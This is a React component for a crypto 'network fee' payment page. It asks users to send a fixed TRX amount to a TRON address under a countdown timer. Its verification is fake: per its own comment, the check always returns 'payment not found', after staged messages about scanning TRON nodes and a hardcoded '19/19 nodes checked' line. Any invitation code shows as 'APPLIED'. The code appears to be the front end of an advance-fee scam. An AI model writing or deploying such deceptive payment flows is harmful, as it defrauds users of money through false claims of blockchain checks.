import React, { useEffect, useState } from 'react';
import QRCode from 'qrcode';
import { motion, AnimatePresence } from 'motion/react';
import {
  Copy,
  CheckCircle2,
  Clock,
  ArrowLeft,
  ShieldCheck,
  AlertTriangle,
  RefreshCw,
  ExternalLink,
  Wallet,
  Sparkles,
  Zap,
  XCircle,
  AlertCircle,
} from 'lucide-react';
import { OrderState } from '../types';
import { LiquidGlassButton } from './LiquidGlassButton';

interface FeePaymentViewProps {
  order: OrderState;
  onBack: () => void;
}

export const FeePaymentView: React.FC<FeePaymentViewProps> = ({ order, onBack }) => {
  const [qrCodeUrl, setQrCodeUrl] = useState<string>('');
  const [addressCopied, setAddressCopied] = useState(false);
  const [amountCopied, setAmountCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(899); // 14:59 minutes
  const [verifying, setVerifying] = useState(false);
  const [verificationStep, setVerificationStep] = useState<string>('');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [checkCount, setCheckCount] = useState<number>(0);
  const [lastCheckedTime, setLastCheckedTime] = useState<string | null>(null);
  const [invitationCode, setInvitationCode] = useState<string>('');

  // Generate QR Code for TRX Address
  useEffect(() => {
    // Generate QR with TRON URI scheme or raw address
    QRCode.toDataURL(order.feeAddress, {
      width: 320,
      margin: 1.5,
      color: {
        dark: '#0B0D13',
        light: '#FFFFFF',
      },
    })
      .then((url) => setQrCodeUrl(url))
      .catch((err) => console.error('QR code generation error:', err));
  }, [order.feeAddress]);

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyToClipboard = async (text: string, type: 'address' | 'amount') => {
    try {
      await navigator.clipboard.writeText(text);
      if (type === 'address') {
        setAddressCopied(true);
        setTimeout(() => setAddressCopied(false), 2500);
      } else {
        setAmountCopied(true);
        setTimeout(() => setAmountCopied(false), 2500);
      }
    } catch {
      // Fallback
    }
  };

  // Simulated check that always returns payment not found
  const handleVerify = () => {
    setErrorMessage(null);
    setVerifying(true);
    setVerificationStep('Querying TRON Network (TRC-20) nodes...');

    setTimeout(() => {
      setVerificationStep(`Scanning mempool & latest blocks for ${order.feeAmount} TRX payload...`);
    }, 1200);

    setTimeout(() => {
      setVerificationStep('Checking address TTLjCgYXrrFCj7LJf3DXa9Kv4u8Np3Lm8r...');
    }, 2200);

    setTimeout(() => {
      setVerifying(false);
      setCheckCount((prev) => prev + 1);
      const now = new Date().toLocaleTimeString();
      setLastCheckedTime(now);
      setErrorMessage(
        `Payment Not Detected: No incoming transaction of ${order.feeAmount} TRX has been received for this address yet. Please complete the transfer from your wallet and try again.`
      );
    }, 3200);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -15 }}
      transition={{ duration: 0.35, ease: 'easeOut' }}
      className="w-full max-w-xl mx-auto"
    >
      {/* Top back navigation */}
      <div className="flex items-center justify-between mb-4 px-1">
        <button
          type="button"
          onClick={onBack}
          className="flex items-center gap-2 text-xs sm:text-sm text-slate-400 hover:text-white transition-colors cursor-pointer px-3 py-1.5 rounded-xl bg-white/[0.03] hover:bg-white/[0.08] border border-white/5"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to Configuration</span>
        </button>

        <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-400/20 text-cyan-300 text-xs font-mono">
          <Clock className="w-3.5 h-3.5 animate-pulse" />
          <span>Session Expires: {formatTimer(timeLeft)}</span>
        </div>
      </div>

      {/* Main Payment Container Card */}
      <div className="liquid-glass-card rounded-3xl p-6 sm:p-8 relative overflow-hidden border border-white/15">
        {/* Subtle top accent bar */}
        <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-cyan-500/20 via-cyan-400 to-cyan-500/20" />

        {/* Active Payment Screen */}
        <div className="space-y-6">
          {/* Header / Notice */}
          <div className="text-center space-y-1.5">
            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-400/20 text-cyan-300 text-xs font-semibold uppercase tracking-wider">
              <ShieldCheck className="w-3.5 h-3.5" />
              Network Fee Required
            </div>
            <h2 className="text-xl sm:text-2xl font-bold text-white tracking-wide">
              Transfer Fee to Complete Order
            </h2>
            <p className="text-xs sm:text-sm text-slate-300">
              Send exactly <span className="font-bold text-cyan-300 text-base font-mono">{order.feeAmount} TRX</span> to the TRON network address below.
            </p>
          </div>

          {/* QR Code and Amount Presentation */}
          <div className="flex flex-col items-center justify-center p-5 rounded-2xl bg-black/40 border border-white/10 relative">
            {/* Glowing QR Box */}
            <div className="relative p-3 bg-white rounded-2xl shadow-xl shadow-cyan-500/5 group">
              {qrCodeUrl ? (
                <img
                  src={qrCodeUrl}
                  alt={`${order.feeAmount} TRX Deposit QR Code`}
                  className="w-48 h-48 sm:w-56 sm:h-56 object-contain rounded-xl"
                />
              ) : (
                <div className="w-48 h-48 sm:w-56 sm:h-56 flex items-center justify-center bg-slate-900 rounded-xl">
                  <RefreshCw className="w-6 h-6 text-slate-400 animate-spin" />
                </div>
              )}
              {/* Central TRON Logo Badge */}
              <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                <div className="w-11 h-11 rounded-full bg-red-600 border-2 border-white flex items-center justify-center text-white font-black text-xs shadow-md">
                  TRX
                </div>
              </div>
            </div>

            {/* Exact Deposit Amount Card */}
            <div className="mt-4 w-full flex items-center justify-between p-3 rounded-xl bg-white/[0.04] border border-white/10">
              <div className="text-left">
                <span className="text-[11px] text-slate-400 uppercase tracking-wider block">
                  Amount to Send
                </span>
                <span className="text-xl font-bold font-mono text-white flex items-center gap-1.5">
                  {order.feeAmount}.00 <span className="text-cyan-400 text-base">TRX</span>
                </span>
              </div>
              <button
                type="button"
                onClick={() => copyToClipboard(order.feeAmount.toString(), 'amount')}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-xs text-slate-200 hover:text-white transition-colors cursor-pointer border border-white/10"
              >
                {amountCopied ? (
                  <>
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span className="text-emerald-400 font-medium">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy Amount</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Recipient Address Box */}
          <div className="space-y-1.5">
            <div className="flex items-center justify-between text-xs text-slate-300">
              <span className="flex items-center gap-1">
                <Wallet className="w-3.5 h-3.5 text-cyan-400" />
                Deposit Address (TRON TRC-20)
              </span>
              <span className="text-[11px] text-emerald-400 font-mono">
                Network: TRON / TRC-20
              </span>
            </div>

            <div className="liquid-glass-input rounded-2xl p-3.5 flex items-center justify-between gap-3 border border-white/15">
              <span className="font-mono text-xs sm:text-sm text-cyan-300 font-medium break-all select-all">
                {order.feeAddress}
              </span>
              <button
                type="button"
                onClick={() => copyToClipboard(order.feeAddress, 'address')}
                className="shrink-0 flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 hover:text-cyan-200 border border-cyan-400/40 text-xs font-semibold transition-all cursor-pointer shadow-sm"
              >
                {addressCopied ? (
                  <>
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span className="text-emerald-400">Copied!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Order Summary Pill Box */}
          <div className="rounded-2xl bg-white/[0.02] border border-white/5 p-4 space-y-2 text-xs">
            <div className="flex justify-between text-slate-300">
              <span className="text-slate-400">Requested Crypto:</span>
              <span className="font-mono font-semibold text-white">
                {order.amount} {order.crypto.symbol} ({order.crypto.name})
              </span>
            </div>
            <div className="flex justify-between text-slate-300">
              <span className="text-slate-400">Target Wallet:</span>
              <span className="font-mono text-slate-200 truncate max-w-[200px]" title={order.destinationAddress}>
                {order.destinationAddress}
              </span>
            </div>
            <div className="flex justify-between text-slate-300">
              <span className="text-slate-400">Fixed Fee:</span>
              <span className="font-mono text-cyan-300 font-bold">{order.feeAmount} TRX</span>
            </div>
            <div className="flex justify-between text-slate-300 border-t border-white/5 pt-2">
              <span className="text-slate-400">Order ID:</span>
              <span className="font-mono text-slate-400">{order.orderId}</span>
            </div>
          </div>

          {/* Warning / Network Advice */}
          <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-sky-500/10 border border-sky-500/20 text-sky-200/90 text-xs">
            <AlertTriangle className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
            <p>
              Please ensure you transfer via the <strong>TRON (TRC-20)</strong> network. 
              Deposits of other assets or sent via different networks cannot be recovered.
            </p>
          </div>

          {/* Payment Error Alert (Shown when user clicks 'I Have Sent ...') */}
          <AnimatePresence>
            {errorMessage && (
              <motion.div
                initial={{ opacity: 0, y: -10, scale: 0.98 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                exit={{ opacity: 0, y: -10, scale: 0.98 }}
                className="p-4 rounded-2xl bg-rose-500/15 border border-rose-500/35 backdrop-blur-md shadow-lg shadow-rose-950/40 text-left space-y-2.5"
              >
                <div className="flex items-center gap-2.5 text-rose-300 font-semibold text-sm">
                  <div className="w-6 h-6 rounded-lg bg-rose-500/20 border border-rose-500/40 flex items-center justify-center shrink-0">
                    <XCircle className="w-4 h-4 text-rose-400" />
                  </div>
                  <span>No Payment Detected</span>
                </div>

                <p className="text-xs text-rose-200/90 leading-relaxed font-normal">
                  {errorMessage}
                </p>

                <div className="pt-1.5 border-t border-rose-500/20 flex items-center justify-between text-[11px] font-mono text-rose-300/75">
                  <span>TRON Nodes Checked: 19/19</span>
                  {lastCheckedTime && <span>Last scan: {lastCheckedTime}</span>}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Verification Status or Button */}
          {verifying ? (
            <div className="p-4 rounded-2xl bg-cyan-500/10 border border-cyan-400/30 text-center space-y-3">
              <div className="flex items-center justify-center gap-3">
                <div className="w-5 h-5 border-2 border-cyan-400 border-t-transparent rounded-full animate-spin" />
                <span className="text-sm font-semibold text-cyan-300">
                  Scanning TRON Blockchain...
                </span>
              </div>
              <p className="text-xs font-mono text-slate-300 animate-pulse">
                {verificationStep}
              </p>
            </div>
          ) : (
            <div className="space-y-4 pt-1">
              {/* Invitation Code Input Box */}
              <div className="space-y-1.5 text-left">
                <label
                  htmlFor="invitation-code-input"
                  className="text-xs font-semibold uppercase tracking-wider text-slate-300"
                >
                  Invitation Code
                </label>
                <div className="liquid-glass-input rounded-2xl p-3.5 flex items-center gap-2.5 border border-white/15 focus-within:border-cyan-400/50 transition-all">
                  <input
                    id="invitation-code-input"
                    type="text"
                    value={invitationCode}
                    onChange={(e) => setInvitationCode(e.target.value)}
                    placeholder="Invitation Code"
                    className="w-full bg-transparent text-sm text-white placeholder:text-slate-500 focus:outline-none font-mono tracking-wider"
                    autoComplete="off"
                    spellCheck={false}
                  />
                  {invitationCode.trim() && (
                    <span className="px-2 py-0.5 text-[10px] font-mono font-semibold rounded bg-cyan-500/20 text-cyan-300 border border-cyan-400/30 shrink-0">
                      APPLIED
                    </span>
                  )}
                </div>
              </div>

              <LiquidGlassButton
                id="btn-confirm-trx-payment"
                onClick={handleVerify}
                icon={<Zap className="w-5 h-5 text-cyan-300" />}
              >
                I Have Sent {order.feeAmount} TRX
              </LiquidGlassButton>
              <p className="text-center text-[11px] text-slate-500">
                Clicking will query TRON explorer to check if {order.feeAmount} TRX has arrived at the destination.
              </p>
            </div>
          )}
        </div>
      </div>
    </motion.div>
  );
};
